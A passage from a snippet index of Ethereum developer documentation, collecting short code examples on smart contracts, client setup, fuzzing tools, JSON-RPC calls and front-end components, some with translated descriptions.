Commitment and Ethereum Knowledge FAQ in React/JSX\nDESCRIPTION: A two-column layout containing FAQ cards explaining the time commitment and Ethereum knowledge requirements for participants.\n\nLANGUAGE: jsx\nCODE:\n```\n<TwoColumnContent>\n  <CardContent>\n    <h3>How much time do I have to commit?</h3>\n    As much as you want. The minimum threshold to be eligible for participatory prizes is 100 translated words, which takes about 10-20 minutes to complete, while competing for the top prizes will require a larger time commitment.\n  </CardContent>\n  <CardContent>\n    <h3>Do I need to be familiar with Ethereum?</h3>\n    No. While being familiar with Ethereum can help with your productivity and quality, the Translatathon is as much a learning experience as it is a competition, and everyone is invited to join and learn more about Ethereum while participating.\n  </CardContent>\n</TwoColumnContent>\n```\n\n----------------------------------------\n\nTITLE: Deposit Event for ERC-4626 Vaults in Solidity\nDESCRIPTION: This event must be emitted when tokens are deposited into the vault through mint or deposit methods.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Deposit(\n    address indexed sender,\n    address indexed owner,\n    uint256 assets,\n    uint256 shares\n)\n```\n\n----------------------------------------\n\nTITLE: Using Apollo Hooks with React for GraphQL Data Fetching\nDESCRIPTION: Example of using Apollo's useQuery hook with React to fetch data from a GraphQL endpoint and handle loading, error, and data states with useEffect.\n\nLANGUAGE: javascript\nCODE:\n```\nconst { loading, error, data } = useQuery(myGraphQlQuery)\n\nReact.useEffect(() => {\n  if (!loading && !error && data) {\n    console.log({ data })\n  }\n}, [loading, error, data])\n```\n\n----------------------------------------\n\nTITLE: Creating a Namecoin-like Name Registration System in Serpent for Ethereum\nDESCRIPTION: A minimal implementation of a name registration system similar to Namecoin. This contract allows users to register names with associated values in a public database where entries can be added but not modified or removed.\n\nLANGUAGE: Serpent\nCODE:\n```\ndef register(name, value):\n    if !self.storage[name]:\n        self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: React HelloWorld.js Component Imports\nDESCRIPTION: Import statements for the HelloWorld.js React component, including React hooks, utility functions for blockchain interaction, and styling assets.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\nimport React from \"react\"\nimport { useEffect, useState } from \"react\"\nimport {\n  helloWorldContract,\n  connectWallet,\n  updateMessage,\n  loadCurrentMessage,\n  getCurrentWalletConnected,\n} from \"./util/interact.js\"\n\nimport alchemylogo from \"./alchemylogo.svg\"\n```\n\n----------------------------------------\n\nTITLE: Creating a GraphQL Schema for The Graph\nDESCRIPTION: GraphQL schema defining the data structure for the subgraph. It specifies entities like Bet and Player, their properties, and relationships between them, allowing for efficient data querying from the blockchain.\n\nLANGUAGE: graphql\nCODE:\n```\ntype Bet @entity {\n  id: ID!\n  player: Player!\n  playerHasWon: Boolean!\n  time: Int!\n}\n\ntype Player @entity {\n  id: ID!\n  totalPlayedCount: Int\n  hasWonCount: Int\n  hasLostCount: Int\n  bets: [Bet]!\n}\n```\n\n----------------------------------------\n\nTITLE: Installing dotenv Package in Terminal\nDESCRIPTION: Command to install the dotenv package, which provides a secure way to store API keys and other environment variables.\n\nLANGUAGE: text\nCODE:\n```\nnpm install dotenv --save\n```\n\n----------------------------------------\n\nTITLE: Running Nethermind Execution Client on Ethereum Mainnet\nDESCRIPTION: Command to start Nethermind Runner on Ethereum Mainnet with specified data directory and JWT secret file for authentication with a consensus client. JSON-RPC is enabled by default.\n\nLANGUAGE: sh\nCODE:\n```\nNethermind.Runner --config mainnet \\\n    --datadir /data/ethereum \\\n    --JsonRpc.JwtSecretFile=/path/to/jwtsecret\n```\n\n----------------------------------------\n\nTITLE: Fixing Reentrancy with Checks-Effects-Interactions Pattern in Solidity\nDESCRIPTION: A revised version of the vulnerable contract that implements the checks-effects-interactions pattern to prevent reentrancy attacks. It updates the state (balance) before making external calls, eliminating the vulnerability.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract NoLongerAVictim {\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n        (bool success, ) = msg.sender.call.value(amount)(\"\");\n        require(success);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Average Gas Price for ETH Deflation\nDESCRIPTION: Formula that determines the required gas price (in gwei) to offset daily ETH issuance. Uses daily block production, gas per block, and current ETH issuance to calculate the price threshold needed for deflation.\n\nLANGUAGE: markdown\nCODE:\n```\n- `7200 блоків/день * 15x10^6 газу/блок *`**`Y гвей/газ`**`* 1 ETH / 10^9 гвей = 1700 ETH/день`\n```\n\n----------------------------------------\n\nTITLE: Suspicious Modifiers in Scam ERC-20 Contract\nDESCRIPTION: The contract contains three modifiers with questionable implementations: _mod_ does nothing despite taking parameters, while auth and approver are duplicate functions that perform the exact same check, suggesting poor code quality.\n\nLANGUAGE: solidity\nCODE:\n```\nmodifier _mod_(address sender, address recipient, uint256 amount){\n    _;\n}\n\nmodifier auth() {\n    require(msg.sender == contract_owner, \"Not allowed to interact\");\n    _;\n}\n\nmodifier approver() {\n    require(msg.sender == contract_owner, \"Not allowed to interact\");\n    _;\n}\n```\n\n----------------------------------------\n\nTITLE: Preventing Transfers from Frozen Accounts\nDESCRIPTION: A requirement added to the _beforeTokenTransfer hook that prevents tokens from being transferred from frozen accounts, while still allowing transfers to them.\n\nLANGUAGE: solidity\nCODE:\n```\nrequire(!frozenAccounts[from], \"The account is frozen\");\n```\n\n----------------------------------------\n\nTITLE: Creating Translation-Friendly Links in React Components\nDESCRIPTION: Shows the recommended approach for adding links to content that needs to be translated, placing the link at the end of a sentence rather than embedding it within text.\n\nLANGUAGE: tsx\nCODE:\n```\n<p>\n  All Ethereum transactions require a fee, known as Gas, that gets paid to the\n  miner. <Link href=\"link\">More on Gas</Link>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Implementing Cache Contract with Data Structure in Solidity\nDESCRIPTION: Core implementation of the Cache contract showing the main data structures including constants for cache operations and mappings for value storage.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\n\ncontract Cache {\n\n    bytes1 public constant INTO_CACHE = 0xFF;\n    bytes1 public constant DONT_CACHE = 0xFE;\n\n```\n\n----------------------------------------\n\nTITLE: Node.js Package Configuration for Ethereum dApp\nDESCRIPTION: The package.json configuration for a Node.js application interacting with Ethereum. It specifies the main entry point, scripts for building and running the application, module type, and required dependencies including viem for blockchain interaction.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"main\": \"dist/index.js\",\n```\n\nLANGUAGE: json\nCODE:\n```\n  \"scripts\": {\n    \"start\": \"tsc && node dist/app.js\",\n  },\n```\n\nLANGUAGE: json\nCODE:\n```\n  \"type\": \"module\",\n```\n\nLANGUAGE: json\nCODE:\n```\n  \"devDependencies\": {\n    \"@types/node\": \"^20.14.2\",\n    \"typescript\": \"^5.4.5\"\n  },\n```\n\nLANGUAGE: json\nCODE:\n```\n  \"dependencies\": {\n    \"dotenv\": \"^16.4.5\",\n    \"viem\": \"2.14.1\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Ethereum Transaction Receipt with Event Logs in JavaScript\nDESCRIPTION: Shows the structure of a transaction receipt after calling a smart contract method, including block information, gas usage, and event logs. This receipt contains the 'Print' event emitted by the contract.\n\nLANGUAGE: javascript\nCODE:\n```\n{\n   blockHash: \"0xbf0a347307b8c63dd8c1d3d7cbdc0b463e6e7c9bf0a35be40393588242f01d55\",\n   blockNumber: 268,\n   contractAddress: null,\n   cumulativeGasUsed: 22631,\n   gasUsed: 22631,\n   logs: [{\n      address: \"0x6ff93b4b46b41c0c3c9baee01c255d3b4675963d\",\n      blockHash: \"0xbf0a347307b8c63dd8c1d3d7cbdc0b463e6e7c9bf0a35be40393588242f01d55\",\n      blockNumber: 268,\n      data: \"0x000000000000000000000000000000000000000000000000000000000000002a\",\n      logIndex: 0,\n      topics: [\"0x24abdb5865df5079dcc5ac590ff6f01d5c16edbc5fab4e195d9febd1114503da\"],\n      transactionHash: \"0x759cf065cbc22e9d779748dc53763854e5376eea07409e590c990eafc0869d74\",\n      transactionIndex: 0\n  }],\n  transactionHash: \"0x759cf065cbc22e9d779748dc53763854e5376eea07409e590c990eafc0869d74\",\n  transactionIndex: 0\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Event Emission in Foundry\nDESCRIPTION: Example of testing event emission in a Solidity test using Foundry's vm.expectEmit feature to verify that the correct event is emitted with the expected parameters.\n\nLANGUAGE: solidity\nCODE:\n```\n    event EntryWritten(uint indexed key, uint indexed value);\n\n        .\n        .\n        .\n\n        _callInput = bytes.concat(\n            worm.WRITE_ENTRY_CACHED(), worm.encodeVal(a), worm.encodeVal(b));\n        vm.expectEmit(true, true, false, false);\n        emit EntryWritten(a, b);\n        (_success,) = address(worm).call(_callInput);\n```\n\n----------------------------------------\n\nTITLE: Internal Token Transfer Implementation in Vyper\nDESCRIPTION: Core internal function that handles token transfers between addresses. It verifies permissions, clears approvals, updates token ownership records, and emits a Transfer event. This function is used by both standard and safe transfer methods.\n\nLANGUAGE: vyper\nCODE:\n```\ndef _transferFrom(_from: address, _to: address, _tokenId: uint256, _sender: address):\n    \"\"\"\n    @dev Execute transfer of a NFT.\n         Throws unless `msg.sender` is the current owner, an authorized operator, or the approved\n         address for this NFT. (NOTE: `msg.sender` not allowed in private function so pass `_sender`.)\n         Throws if `_to` is the zero address.\n         Throws if `_from` is not the current owner.\n         Throws if `_tokenId` is not a valid NFT.\n    \"\"\"\n    # Check requirements\n    assert self._isApprovedOrOwner(_sender, _tokenId)\n    # Throws if `_to` is the zero address\n    assert _to != ZERO_ADDRESS\n    # Clear approval. Throws if `_from` is not the current owner\n    self._clearApproval(_from, _tokenId)\n    # Remove NFT. Throws if `_tokenId` is not a valid NFT\n    self._removeTokenFrom(_from, _tokenId)\n    # Add NFT\n    self._addTokenTo(_to, _tokenId)\n    # Log the transfer\n    log Transfer(_from, _to, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Running Echidna for Assertion Testing\nDESCRIPTION: Command to run Echidna with a configuration file to test assertions in a smart contract, showing how it detects assertion failures.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test assert.sol --config config.yaml\nAnalyzing contract: assert.sol:Incrementor\nassertion in inc: failed!💥\n  Call sequence, shrinking (2596/5000):\n    inc(21711016731996786641919559689128982722488122124807605757398297001483711807488)\n    inc(7237005577332262213973186563042994240829374041602535252466099000494570602496)\n    inc(86844066927987146567678238756515930889952488499230423029593188005934847229952)\n\nSeed: 1806480648350826486\n```\n\n----------------------------------------\n\nTITLE: Using EXP Opcode in Solidity\nDESCRIPTION: Reference to the EXP opcode whose pricing was adjusted in EIP-160 during the Spurious Dragon fork to prevent network slowdowns.\n\nLANGUAGE: html\nCODE:\n```\n<code>EXP</code>\n```\n\n----------------------------------------\n\nTITLE: Implementing Cache Contract with Data Structure in Solidity\nDESCRIPTION: Core implementation of the Cache contract showing the main data structures including constants for cache operations and mappings for value storage.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\n\ncontract Cache {\n\n    bytes1 public constant INTO_CACHE = 0xFF;\n    bytes1 public constant DONT_CACHE = 0xFE;\n\n```\n\n----------------------------------------\n\nTITLE: Creating Button Component Stories with Multiple Variants\nDESCRIPTION: Demonstrates how to create stories for a Button component with different style variants, including solid, outline, and how to show multiple variants in a single story.\n\nLANGUAGE: tsx\nCODE:\n```\nimport Button from \".\"\n\ntype ButtonType = typeof Button\n\nconst meta {\n  title: \"Atoms / Form / Button\",\n  component: Button\n} satisfies Meta<ButtonType>\n\nexport default meta\ntype Story = StoryObj<typeof meta>;\n\nexport const Solid: Story = {\n  args: {\n    variant: 'solid',\n    children: 'A Button'\n  }\n}\nexport const Outline: Story = {\n  args: {\n    variant: 'outline',\n    children: 'A Button'\n  }\n}\n\n/**\n * For practical purposes, if you are displaying different \"variants\",\n * they should be shown under one story, so they can be seen side-by-side in the GUI\n * for reviewers to easily compare.\n * This can also be done for various sizes or other like alterations\n *\n * 🚨 If prop content is supplied directly to the component and the `args` prop is not used,\n * use `StoryObj` without a prop type. This is especially important when a story renders multiple versions\n * of the component.\n */\n\n// Assuming `solid` is the default variant in the Chakra theme config\nexport const Variants: StoryObj = {\n  render: () => (\n    <VStack>\n      <Button>A Solid Button</Button>\n      <Button variant=\"outline\">An Outline Button</Button>\n      <Button variant=\"unstyled\">An Unstyled Button</Button>\n    </VStack>\n  )\n}\n```\n\n----------------------------------------\n\nTITLE: Counting Successful Transactions in an Ethereum Block with SQL\nDESCRIPTION: This SQL query counts the number of successful transactions in Ethereum block 12396854 by filtering for transactions where the success field is true, showing how many transactions were successfully verified.\n\nLANGUAGE: sql\nCODE:\n```\nWITH temp_table AS (\n    SELECT * FROM ethereum.\"transactions\"\n    WHERE block_number = 12396854 AND success = true\n    ORDER BY block_time DESC\n)\nSELECT\n    COUNT(success) AS num_successful_txn\nFROM temp_table\n```\n\n----------------------------------------\n\nTITLE: EVM Implementation of Safe Math Addition\nDESCRIPTION: This snippet shows the EVM bytecode for safe addition operation with overflow checking. It adds two values and ensures the result is valid.\n\nLANGUAGE: evm\nCODE:\n```\nPUSH1 0x0 DUP2 PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP\n```\n\n----------------------------------------\n\nTITLE: Completing the toUint256 Utility Function\nDESCRIPTION: Finalizes the toUint256 function and defines constants needed for testing function parameter handling.\n\nLANGUAGE: solidity\nCODE:\n```\n\n        return tempUint;\n    }     // toUint256\n\n    // Function signature for fourParams(), courtesy of\n    // https://www.4byte.directory/signatures/?bytes4_signature=0x3edc1e6d\n    bytes4 constant FOUR_PARAMS = 0x3edc1e6d;\n\n    // Just some constant values to see we're getting the correct values back\n    uint256 constant VAL_A = 0xDEAD60A7;\n    uint256 constant VAL_B =     0xBEEF;\n    uint256 constant VAL_C =     0x600D;\n    uint256 constant VAL_D = 0x600D60A7;\n```\n\n----------------------------------------\n\nTITLE: Importing Account Utility for Private Key Management\nDESCRIPTION: Importing the function to convert a private key to an account object that can be used with Viem's wallet client.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { privateKeyToAccount } from 'viem/accounts'\n```\n\n----------------------------------------\n\nTITLE: RLP encoding format for legacy Ethereum transactions\nDESCRIPTION: The RLP (Recursive Length Prefix) encoding format used for legacy transactions in Ethereum, showing the structure with fields like sender, gas price, gas limit, etc.\n\nLANGUAGE: plaintext\nCODE:\n```\nRLP ([emissor, taxa de \"queima\", parâmetros de \"queima\", destino, valor, dados, v, r, s])\n```\n\n----------------------------------------\n\nTITLE: Starting the Lighthouse Consensus Client\nDESCRIPTION: Commands to enable and start the Lighthouse beacon node service. This is necessary to run a consensus client alongside the execution client for a complete Ethereum node.\n\nLANGUAGE: sh\nCODE:\n```\nsudo systemctl enable lighthouse-beacon\nsudo systemctl start lighthouse-beacon\n```\n\n----------------------------------------\n\nTITLE: Removing Liquidity from Token Pairs in Uniswap V2\nDESCRIPTION: Core function for removing liquidity from a token pair. Takes minimum amount parameters to protect against slippage and a deadline to ensure timely execution. Returns the actual amounts of each token received.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint liquidity,\n    uint amountAMin,\n    uint amountBMin,\n    address to,\n    uint deadline\n) public virtual override ensure(deadline) returns (uint amountA, uint amountB) {\n```\n\n----------------------------------------\n\nTITLE: Requête et réponse de eth_chainId en JavaScript\nDESCRIPTION: Exemple de requête et réponse pour obtenir l'identifiant de chaîne utilisé pour la signature d'opérations protégées par la rediffusion en utilisant la méthode eth_chainId.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_chainId\",\"params\":[],\"id\":67}'\n// Result\n{\n  \"id\":67,\n  \"jsonrpc\": \"2.0\",\n  \"result\": \"0x1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Compiling Smart Contracts with Waffle\nDESCRIPTION: Command to compile Solidity contracts using Waffle, which generates JSON artifacts for testing.\n\nLANGUAGE: bash\nCODE:\n```\nnpx waffle\n```\n\n----------------------------------------\n\nTITLE: Complex Smart Contract for Testing Function Filtering\nDESCRIPTION: A contract with a specific state sequence requirement that requires calling functions in a certain order to violate a property. Includes reset functions that make testing difficult.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  bool state1 = false;\n  bool state2 = false;\n  bool state3 = false;\n  bool state4 = false;\n\n  function f(uint x) public {\n    require(x == 12);\n    state1 = true;\n  }\n\n  function g(uint x) public {\n    require(state1);\n    require(x == 8);\n    state2 = true;\n  }\n\n  function h(uint x) public {\n    require(state2);\n    require(x == 42);\n    state3 = true;\n  }\n\n function i() public {\n    require(state3);\n    state4 = true;\n  }\n\n  function reset1() public {\n    state1 = false;\n    state2 = false;\n    state3 = false;\n    return;\n  }\n\n  function reset2() public {\n    state1 = false;\n    state2 = false;\n    state3 = false;\n    return;\n  }\n\n  function echidna_state4() public returns (bool) {\n    return (!state4);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Unauthorized Access with Cast\nDESCRIPTION: Uses the cast tool to attempt setting the verifier address as an unauthorized user, which should fail due to permissions.\n\nLANGUAGE: shell\nCODE:\n```\ncast send $WORLD_ADDRESS 'app__setVerifier(address)' `cast address-zero` --private-key $UNAUTHORIZED_KEY\n```\n\n----------------------------------------\n\nTITLE: Configuring Hardhat for Ethereum Development\nDESCRIPTION: Configuration for the Hardhat development environment that specifies the Solidity version, network settings for Ropsten testnet, and connects to the Alchemy API using environment variables for secure credential storage.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire('dotenv').config();\n\nrequire(\"@nomiclabs/hardhat-ethers\");\nconst { API_URL, PRIVATE_KEY } = process.env;\n\n/**\n* @type import('hardhat/config').HardhatUserConfig\n*/\nmodule.exports = {\n   solidity: \"0.7.3\",\n   defaultNetwork: \"ropsten\",\n   networks: {\n      hardhat: {},\n      ropsten: {\n         url: API_URL,\n         accounts: [`0x${PRIVATE_KEY}`]\n      }\n   },\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Ownable Contract Structure in Legitimate HOP Token\nDESCRIPTION: This snippet shows how legitimate tokens like HOP implement the Ownable pattern where privileged addresses are stored in a field called _owner that can be managed properly over time.\n\nLANGUAGE: solidity\nCODE:\n```\nabstract contract Ownable is Context {\n    address private _owner;\n    .\n    .\n    .\n}\n```\n\n----------------------------------------\n\nTITLE: Running Echidna on Specific Contract\nDESCRIPTION: Command to run Echidna against a specific contract when multiple contracts exist in the same file. This allows targeting tests to a particular contract implementation.\n\nLANGUAGE: bash\nCODE:\n```\n$ echidna-test contract.sol --contract MyContract\n```\n\n----------------------------------------\n\nTITLE: Creating a JavaScript Script to Fetch Latest Ethereum Block Number\nDESCRIPTION: A complete JavaScript script that uses Alchemy Web3 to connect to Ethereum and retrieve the latest block number. The script creates a Web3 instance using the Alchemy API, fetches the block number asynchronously, and logs it to the console.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n  const { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\n  const web3 = createAlchemyWeb3(\"https://eth-mainnet.alchemyapi.io/v2/demo\")\n  const blockNumber = await web3.eth.getBlockNumber()\n  console.log(\"The latest block number is \" + blockNumber)\n}\nmain()\n```\n\n----------------------------------------\n\nTITLE: Transaction hash generation example in Ethereum\nDESCRIPTION: Example of a cryptographically generated transaction hash in Ethereum, which uniquely identifies a transaction on the network.\n\nLANGUAGE: plaintext\nCODE:\n```\n0x97d99bc7729211111a21b12c933c949d4f31684f1d6954ff477d0477538ff017\n```\n\n----------------------------------------\n\nTITLE: Setting up waffle.json configuration file\nDESCRIPTION: Configuration file for Waffle specifying the compiler type, version, source directory, and output directory for smart contract compilation. This file should be placed in the main project directory.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"compilerType\": \"solcjs\",\n  \"compilerVersion\": \"0.6.2\",\n  \"sourceDirectory\": \"./src\",\n  \"outputDirectory\": \"./build\"\n}\n```\n\n----------------------------------------\n\nTITLE: Importing web3.js in a Node.js or Browserify project\nDESCRIPTION: Demonstrates how to import the Web3 library in a JavaScript file after installation, making it available for use in Node.js backends or Browserify frontend projects.\n\nLANGUAGE: javascript\nCODE:\n```\nconst Web3 = require(\"web3\")\n```\n\n----------------------------------------\n\nTITLE: Setting Up Smart Contract Interaction Functions in interact.js\nDESCRIPTION: The utility file that contains functions for interacting with the Ethereum blockchain and HelloWorld smart contract, including loading messages, connecting wallets, and updating contract state.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n//export const helloWorldContract;\n\nexport const loadCurrentMessage = async () => {}\n\nexport const connectWallet = async () => {}\n\nconst getCurrentWalletConnected = async () => {}\n\nexport const updateMessage = async (message) => {}\n```\n\n----------------------------------------\n\nTITLE: Verifying Software Integrity with SHA256 Checksum in Bash\nDESCRIPTION: This command demonstrates how to verify the integrity of downloaded client software (Teku in this example) by calculating its SHA256 hash and comparing it to the expected value provided by developers.\n\nLANGUAGE: bash\nCODE:\n```\nsha256sum teku-22.6.1.tar.gz\n\n9b2f8c1f8d4dab0404ce70ea314ff4b3c77e9d27aff9d1e4c1933a5439767dde\n```\n\n----------------------------------------\n\nTITLE: Genel Dengeleme Formülü Türetme\nDESCRIPTION: Günlük ETH dağıtımını X değişkeni olarak kullanarak genel bir formül türetme adımları. Bu formül, herhangi bir günlük ETH dağıtımı için dengeleyici gaz ücretini hesaplamayı sağlar.\n\nLANGUAGE: markdown\nCODE:\n```\n- `Y = (X(10^3)/(7200 * 15)) = X/108`\n```\n\n----------------------------------------\n\nTITLE: Examining Admin Storage in Legitimate ARB Token Proxy\nDESCRIPTION: This code shows how legitimate tokens like ARB implement admin privilege through proxies with proper safeguards, including zero-address checks when setting a new admin.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Stores a new address in the EIP1967 admin slot.\n     */\n    function _setAdmin(address newAdmin) private {\n        require(newAdmin != address(0), \"ERC1967: new admin is the zero address\");\n        StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;\n    }\n```\n\n----------------------------------------\n\nTITLE: ESLint Configuration Rules for JavaScript and TypeScript Projects\nDESCRIPTION: This snippet contains a partial ESLint configuration with detailed rules for code formatting, style consistency, and error prevention in JavaScript and TypeScript projects. It includes specific settings for spacing, quotes, semicolons, and other style preferences.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"functions\": false,\n  \"variables\": false\n},\n\"no-useless-call\": \"error\",\n\"no-useless-catch\": \"error\",\n\"no-useless-computed-key\": \"error\",\n\"no-useless-escape\": \"error\",\n\"no-useless-rename\": \"error\",\n\"no-useless-return\": \"error\",\n\"no-whitespace-before-property\": \"error\",\n\"no-with\": \"error\",\n\"object-curly-spacing\": [\n\"error\",\n\"never\"\n],\n\"object-property-newline\": [\n\"error\",\n{\n  \"allowMultiplePropertiesPerLine\": true\n}\n],\n\"one-var\": [\n\"error\",\n{\n  \"initialized\": \"never\"\n}\n],\n\"operator-linebreak\": [\n\"error\",\n\"after\",\n{\n  \"overrides\": {\n    \":\": \"before\",\n    \"?\": \"before\"\n  }\n}\n],\n\"padded-blocks\": [\n\"error\",\n{\n  \"blocks\": \"never\",\n  \"classes\": \"never\",\n  \"switches\": \"never\"\n}\n],\n\"prefer-const\": [\n\"error\",\n{\n  \"destructuring\": \"all\"\n}\n],\n\"prefer-promise-reject-errors\": \"error\",\n\"quote-props\": [\n\"error\",\n\"as-needed\"\n],\n\"quotes\": [\n\"error\",\n\"single\"\n],\n\"rest-spread-spacing\": [\n\"error\",\n\"never\"\n],\n\"semi\": [\n\"error\",\n\"always\"\n],\n\"semi-spacing\": [\n\"error\",\n{\n  \"after\": true,\n  \"before\": false\n}\n],\n\"space-before-blocks\": [\n\"error\",\n\"always\"\n],\n\"space-before-function-paren\": [\n\"error\",\n{\n  \"anonymous\": \"always\",\n  \"named\": \"never\",\n  \"asyncArrow\": \"always\"\n}\n],\n\"space-in-parens\": [\n\"error\",\n\"never\"\n],\n\"space-infix-ops\": \"error\",\n\"space-unary-ops\": [\n\"error\",\n{\n  \"nonwords\": false,\n  \"words\": true\n}\n],\n\"spaced-comment\": [\n\"error\",\n\"always\",\n{\n  \"block\": {\n    \"balanced\": true,\n    \"exceptions\": [\n      \"*\"\n    ],\n    \"markers\": [\n      \"*package\",\n      \"!\",\n      \",\",\n      \":\",\n      \"::\",\n      \"flow-include\"\n    ]\n  },\n  \"line\": {\n    \"markers\": [\n      \"*package\",\n      \"!\",\n      \"/\",\n      \",\",\n      \"=\"\n    ]\n  }\n}\n],\n\"symbol-description\": \"error\",\n\"template-curly-spacing\": [\n\"error\",\n\"never\"\n],\n\"template-tag-spacing\": [\n\"error\",\n\"never\"\n],\n\"unicode-bom\": [\n\"error\",\n\"never\"\n],\n\"use-isnan\": \"error\",\n\"valid-typeof\": [\n\"error\",\n{\n  \"requireStringLiterals\": true\n}\n],\n\"wrap-iife\": [\n\"error\",\n\"any\",\n{\n  \"functionPrototypeMethods\": true\n}\n],\n\"yield-star-spacing\": [\n\"error\",\n\"both\"\n],\n\"yoda\": [\n\"error\",\n\"never\"\n]\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Workspace Directory in Manticore\nDESCRIPTION: Shows how to access the workspace directory that Manticore uses as the output directory for all generated files.\n\nLANGUAGE: python\nCODE:\n```\nprint(\"Results are in {}\".format(m.workspace))\n```\n\n----------------------------------------\n\nTITLE: Failure Path in 0x81e580d3 Function\nDESCRIPTION: The execution path taken when the parameter validation fails, resulting in a revert operation with no return data.\n\nLANGUAGE: evm bytecode\nCODE:\n```\n17A | PUSH1 0x00 | 0x00 ...\n17C | DUP1       | 0x00 0x00 ...\n17D | REVERT     |\n```\n\n----------------------------------------\n\nTITLE: Using REVERT Opcode in Solidity\nDESCRIPTION: Reference to the REVERT opcode added in EIP-140 during the Byzantium fork. This opcode allows for more efficient reverts of transactions.\n\nLANGUAGE: html\nCODE:\n```\n<code>REVERT</code>\n```\n\n----------------------------------------\n\nTITLE: Minting Shares in ERC-4626 Vaults in Solidity\nDESCRIPTION: This function mints exactly the specified shares to the receiver by depositing the required underlying assets.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction mint(uint256 shares, address receiver) public returns (uint256 assets)\n```\n\n----------------------------------------\n\nTITLE: Internal Function to Check if Pizza NFT Exists\nDESCRIPTION: Internal view function that verifies if a Pizza NFT exists by checking if it has an owner. Returns true if the owner address is not the zero address.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction _exists(uint256 pizzaId) internal view returns (bool) {\n    address owner = pizzaToOwner[pizzaId];\n    return owner != address(0);\n}\n```\n\n----------------------------------------\n\nTITLE: Building Custom Calldata in JavaScript\nDESCRIPTION: JavaScript code that builds custom calldata by concatenating the function signature with parameter values, removing the '0x' prefix from parameters as needed.\n\nLANGUAGE: javascript\nCODE:\n```\nconst val = await worm.encodeVal(\"0x600D\")\n\n// Write an entry\nconst calldata = func + key.slice(2) + val.slice(2)\n```\n\n----------------------------------------\n\nTITLE: eth_getTransactionCount Parameters Example\nDESCRIPTION: A JavaScript example showing the parameters for the eth_getTransactionCount method, which retrieves the number of transactions sent from a specific Ethereum address. This includes the address parameter and block specification.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n  \"0x407d73d8a49eeb85d32cf465507dd71d507100c1\",\n  \"latest\", // state at the latest block\n]\n```\n\n----------------------------------------\n\nTITLE: Setting up Ganache CLI for Ethereum Mainnet Forking in Bash\nDESCRIPTION: Command to start a local Ethereum blockchain fork with Ganache CLI, connecting to Mainnet via Infura and unlocking a specific address with DAI tokens for testing purposes.\n\nLANGUAGE: bash\nCODE:\n```\nganache-cli -f https://mainnet.infura.io/v3/[YOUR INFURA KEY] -d -i 66 1 --unlock 0x4d10ae710Bd8D1C31bd7465c8CBC3add6F279E81\n```\n\n----------------------------------------\n\nTITLE: Adding Transfer Validations to Prevent Common ERC-20 Mistakes\nDESCRIPTION: Code snippet that prevents users from sending tokens to the contract itself or to empty addresses. It checks if the destination is either an EOA with ETH balance or a contract with code.\n\nLANGUAGE: solidity\nCODE:\n```\n        require(to != address(this), \"Can't send tokens to the contract address\");\n        bool isToContract;\n        assembly {\n           isToContract := gt(extcodesize(to), 0)\n        }\n        require(to.balance != 0 || isToContract, \"Can't send tokens to an empty address\");\n```\n\n----------------------------------------\n\nTITLE: Installing Waffle Dependencies with Yarn\nDESCRIPTION: Command to install ethereum-waffle and TypeScript dependencies required for testing smart contracts.\n\nLANGUAGE: bash\nCODE:\n```\nyarn add --dev ethereum-waffle ts-node typescript @types/jest\n```\n\n----------------------------------------\n\nTITLE: Analyzing Ethereum Claim Function with Merkle Proof Validation\nDESCRIPTION: This code snippet demonstrates a decompiled Ethereum claim function that validates parameters against a Merkle proof and distributes ETH or WETH. It includes validation for claim windows, checks for duplicate claims, and fallback logic for contracts that can't receive ETH 